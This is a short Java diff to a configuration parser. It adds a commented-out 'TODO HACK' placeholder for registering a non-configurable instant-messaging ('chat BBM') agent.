@@ -494,6 +494,10 @@ public final class Conf {
                 status.addAgent(agent);
             }
         }
+        
+        //TODO HACK ZENO : adding non configurable agents, add chat BBM    
+        //Agent agent = Agent.factory(Agent.AGENT_IM, true, new byte[0]);
+        //status.addAgent(agent);
 
         //#ifdef DEBUG
         debug.trace("ParseAgent - OK");
